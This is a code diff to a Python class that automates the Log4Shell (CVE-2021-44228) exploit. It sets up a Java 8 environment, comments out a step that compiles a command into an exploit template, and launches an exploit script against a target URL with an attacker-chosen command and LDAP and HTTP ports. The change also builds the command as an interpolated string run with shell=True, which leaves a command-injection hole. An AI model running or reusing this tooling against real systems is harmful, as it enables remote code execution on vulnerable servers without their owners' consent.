@@ -349,29 +349,23 @@ class Trainman:
             jvm_install_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env
         )
         env['JAVA_HOME'] = '/root/.jabba/jdk/adopt@1.8.0-292'
-        env['PATH'] = env['PATH'] + ':/root/.jabba/jdk/adopt@1.8.0-292/bin'
-        with open('/L4sh/db/template.java', 'r') as template:
-            exploit_code = template.read().replace('CMDGOSHERE', exec_cmd)
-        with open('/tmp/Main.java', 'w') as temp_java:
-            temp_java.write(exploit_code)
-        build_exploit_cmd = ['javac', '/tmp/Main.java']
-        subprocess.Popen(
-            build_exploit_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env
-        )
+        #with open('/L4sh/db/template.java', 'r') as template:
+        #    exploit_code = template.read().replace('CMDGOSHERE', exec_cmd)
+        #with open('/tmp/Main.java', 'w') as temp_java:
+        #    temp_java.write(exploit_code)
+        #build_exploit_cmd = ['/root/.jabba/jdk/adopt@1.8.0-292/bin/javac', '/tmp/Main.java']
+        #subprocess.Popen(
+        #    build_exploit_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env
+        #)
         exploit_cve_2021_44228_cmd = [
-            'python3',
-            'main.py',
-            '-i', f'{self.host_info[2]}',
-            '-u', f'{target_url}',
-            '-c', f'{exec_cmd}',
-            '-p', f'{http_port}',
-            '-l', f'{ldap_port}'
+            f'python3 main.py -i {self.host_info[2]} -u {target_url} -c {exec_cmd} -p {http_port} -l {ldap_port}'
         ]
         exploit_cve_2021_44228 = subprocess.Popen(
             exploit_cve_2021_44228_cmd,
             stdin=subprocess.PIPE,
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
+            shell=True,
             env=env,
             cwd=r'/L4sh'
         )
